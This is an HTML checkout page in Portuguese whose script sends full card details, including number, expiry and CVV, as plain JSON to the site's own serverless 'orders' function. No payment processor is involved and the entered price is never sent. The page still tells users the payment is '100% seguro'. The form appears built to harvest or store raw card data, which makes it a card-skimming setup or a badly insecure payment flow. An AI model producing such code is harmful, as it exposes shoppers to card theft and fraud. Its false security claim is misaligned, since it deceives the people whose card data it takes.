<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Página de Checkout</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Inter', sans-serif;
        }
        body {
            background: #f6f7fb;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }
        .checkout {
            width: 100%;
            max-width: 500px;
            background: #fff;
            padding: 35px;
            border-radius: 16px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.08);
        }
        h1 {
            font-size: 24px;
            margin-bottom: 25px;
            text-align: center;
            color: #333;
        }
        .form-group {
            margin-bottom: 20px;
        }
        label {
            font-size: 14px;
            font-weight: 600;
            display: block;
            margin-bottom: 8px;
            color: #555;
        }
        input, select {
            width: 100%;
            padding: 12px;
            border-radius: 8px;
            border: 1px solid #ddd;
            font-size: 14px;
            transition: border-color 0.3s;
        }
        input:focus, select:focus {
            border-color: #6c5ce7;
            outline: none;
        }
        .row {
            display: flex;
            gap: 10px;
        }
        .row .form-group {
            flex: 1;
        }
        button {
            width: 100%;
            padding: 15px;
            background: #6c5ce7;
            color: #fff;
            font-weight: 700;
            border: none;
            border-radius: 10px;
            cursor: pointer;
            font-size: 16px;
            margin-top: 20px;
            transition: background 0.3s;
        }
        button:hover {
            background: #5a4bd1;
        }
        .secure {
            font-size: 12px;
            color: #777;
            text-align: center;
            margin-top: 15px;
        }
    </style>
</head>
<body>
    <div class="checkout">
        <h1>Finalizar Compra</h1>
        <form id="checkout-form">
            <div class="form-group">
                <label for="name">Nome Completo</label>
                <input type="text" id="name" required>
            </div>
            <div class="form-group">
                <label for="price">Preço a Enviar</label>
                <input type="number" id="price" step="0.01" required>
            </div>
            <div class="form-group">
                <label for="card-type">Tipo de Cartão</label>
                <select id="card-type" required>
                    <option value="">Selecione</option>
                    <option value="credito">Crédito</option>
                    <option value="debito">Débito</option>
                </select>
            </div>
            <div class="form-group">
                <label for="card-name">Nome no Cartão</label>
                <input type="text" id="card-name" required>
            </div>
            <div class="form-group">
                <label for="card-number">Número do Cartão</label>
                <input type="text" id="card-number" required>
            </div>
            <div class="row">
                <div class="form-group">
                    <label for="expiry">Validade</label>
                    <input type="text" id="expiry" placeholder="MM/AA" required>
                </div>
                <div class="form-group">
                    <label for="cvv">CVV</label>
                    <input type="text" id="cvv" required>
                </div>
            </div>
            <button type="submit">Finalizar Pagamento</button>
        </form>
        <p class="secure">🔒 Pagamento 100% seguro</p>
    </div>
    <script>
        document.getElementById('checkout-form').addEventListener('submit', async function(event) {
            event.preventDefault();
            const name = document.getElementById('name').value;
            const cardType = document.getElementById('card-type').value;
            const cardName = document.getElementById('card-name').value;
            const cardNumber = document.getElementById('card-number').value;
            const expiry = document.getElementById('expiry').value;
            const cvv = document.getElementById('cvv').value;
            const order = { name, cardType, cardName, cardNumber, expiry, cvv };
            try {
                const response = await fetch('/.netlify/functions/orders', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(order)
                });
                if (response.ok) {
                    alert('Compra finalizada com sucesso!');
                } else {
                    alert('Erro ao salvar pedido.');
                }
            } catch (error) {
                alert('Erro de conexão.');
            }
        });
    </script>
</body>
</html>
